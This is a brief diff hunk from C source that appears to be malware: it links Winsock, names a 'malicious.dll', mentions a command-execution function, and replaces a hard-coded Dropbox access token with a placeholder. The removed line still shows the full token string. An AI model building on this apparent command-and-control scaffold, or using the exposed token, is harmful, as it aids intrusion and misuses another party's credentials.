@@ -18,7 +18,7 @@
 
 #pragma comment(lib, "ws2_32.lib")
 
-#define ACCESS_TOKEN "sl.CCXr2HUMVWGVSdpkHAvhNNWcX4dD7zK16lbe0NArtdZcE4dq63AAzQ8N2Ob8Y3D3Fnd4p2rB71qgysYtuDFxXuyw9VAoL9dkpojE7LxzC5slAe5RRI1q-xT4zcK4gGKCBiQsYIbUjHd0IX0IIdYJ"
+#define ACCESS_TOKEN "<DROPBOX API KEY>"
 #define DLL_NAME "malicious.dll"
 
 // function to execute commands and return the output
